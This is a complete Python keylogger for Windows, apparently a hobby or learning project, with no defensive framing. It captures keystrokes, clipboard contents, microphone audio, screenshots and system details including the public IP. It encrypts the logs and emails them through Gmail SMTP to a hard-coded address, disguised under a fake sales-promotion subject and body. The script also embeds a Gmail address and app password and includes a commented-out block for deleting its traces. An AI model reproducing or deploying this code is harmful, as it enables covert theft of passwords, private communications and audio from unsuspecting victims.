# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform


import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet


from requests import get

from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address="mopliehhfihsk@gmail.com"
#pasword="*Azertyu1234"
password="atpv kmak nten capn"
toaddr="mopliehhfihsk@gmail.com"


key = "pfUx8_Vbt2CXxy2AA38eat8hVvulowvD0iP6A0Vbqcw=" # Generate an encryption key from the Cryptography folder

file_path="C:\\Users\\admin\\PycharmProjects\\keylogging\\python"

extend="\\"


file_merge = file_path + extend


# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()#SUPPORT character texts and email attachements video audio images
    # storing the senders email address
    msg['From'] = fromaddr
    # storing the receivers email address
    msg['To'] = toaddr
    # storing the subject
    msg['Subject'] = "SOLD OUT"
    # string to store the body of the mail
    body = "Exciting news! It's that time of the year again – tiffany is thrilled to announce our Best Sale of the Season!"
    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))
    # open the file to be sent
    filename = filename
    attachment = open(attachment, 'rb')
    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')
    # To change the payload into encoded form
    p.set_payload((attachment).read())
    # encode into base64
    encoders.encode_base64(p)


    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    # attach the instance 'p' to instance 'msg'
    msg.attach(p)
    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()
    # Authentication
    s.login(fromaddr, password)
    # Converts the Multipart msg into a string
    text = msg.as_string()
    # sending the mail
    s.sendmail(fromaddr, toaddr, text)
    # terminating the session
    s.quit()

#send_email(keys_information, file_path + extend + keys_information, toaddr) fjuf

# get the computer information
def computer_information():
    # Open a file in append mode to store system information
    with open(file_path + extend + system_information, "a") as f:
        # Get the hostname of the computer
        hostname = socket.gethostname()
        # Get the local (private) IP address of the computer
        IPAddr = socket.gethostbyname(hostname)

        try:
            # Attempt to get the public IP address using an external service
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            # If an exception occurs (likely due to reaching a maximum query limit),
            # write a message indicating that the public IP address couldn't be obtained
            f.write("Couldn't get Public IP Address (most likely max query)")

        # Write various system information to the file
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipboard contents
def copy_clipboard():
    # Open a file in append mode to store clipboard information
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            # Try to open the clipboard
            win32clipboard.OpenClipboard()

            # Get the data currently in the clipboard
            pasted_data = win32clipboard.GetClipboardData()

            # Close the clipboard
            win32clipboard.CloseClipboard()


            # Write the clipboard data to the file
            f.write("Clipboard Data: \n" + pasted_data+"\n")

        except:
            # If an exception occurs (e.g., unable to open clipboard),
            # write a message indicating that the clipboard data could not be copied
            f.write("Clipboard could not be copied")


# Call the function to copy clipboard data
copy_clipboard()


# get the microphone
def microphone():
    # Set the sampling frequency (fs) and the duration of recording in seconds
    fs = 44100
    seconds = microphone_time

    # Record audio using the sounddevice library
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    # Write the recorded audio data to a WAV file
    write(file_path + extend + audio_information, fs, myrecording)


# Call the microphone function to record audio
microphone()


def screenshot():
    # Use the ImageGrab module to capture the screen
    im = ImageGrab.grab()

    # Save the captured screenshot to a file
    im.save(file_path + extend + screenshot_information)


# Call the screenshot function to capture and save a screenshot
screenshot()

# Initialize variables for the timer
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Main loop: Continue capturing keystrokes for the specified number of iterations
while number_of_iterations < number_of_iterations_end:

    # Initialize variables for keystroke counting
    count = 0
    keys = []

    # Callback function for key press event
    def on_press(key):
        global keys, count, currentTime

        # Print the pressed key for debugging
        print(key)

        # Append the key to the list
        keys.append(key)
        count += 1
        currentTime = time.time()

        # Check if a certain count is reached
        if count >= 1:
            count = 0
            # Write the collected keys to a file
            write_file(keys)
            keys = []

    # Function to write collected keys to a file
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                # If the key is a space, write a new line
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                # Exclude keys starting with "Key"
                elif k.find("Key") == -1:
                    f.write(k)
            f.close()

    # Callback function for key release event
    def on_release(key):
        # If the escape key is pressed or the specified time is reached, stop the keylogger
        if key == Key.esc or currentTime > stoppingTime:
            return False

    # Start the keyboard listener with the defined callbacks
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Check if the specified stopping time is reached
    if currentTime > stoppingTime:
        # Clear the keys file
       with open(file_path + extend + keys_information, "w") as f:
        f.write(" ")

        # Capture a screenshot and send it via email
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)


        # Copy clipboard content
        copy_clipboard()
        #send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
        #keys_logging conttent
        #send_email(keys_information, file_path + extend + keys_information, toaddr)
        #microphone
        #microphone()
        #send_email(audio_information, file_path + extend + audio_information, toaddr)
        # Increment the iteration count
        number_of_iterations += 1

        # Reset the timer for the next iterationn
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
# List of files to encrypt and their corresponding encrypted file names
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

# Initialize counter for iterating through files
count = 0

# Loop through each file to encrypt
for encrypting_file in files_to_encrypt:

    # Read the content of the file to be encrypted
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    # Initialize Fernet encryption with the provided key
    fernet = Fernet(key)

    # Encrypt the file content
    encrypted = fernet.encrypt(data)

    # Write the encrypted content to a new file
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    # Send the encrypted file via email
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)

    # Increment the counter for the next file
    count += 1




# Clean up our tracks and delete files
#delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
#for file in delete_files:
 #  os.remove(file_merge + file)
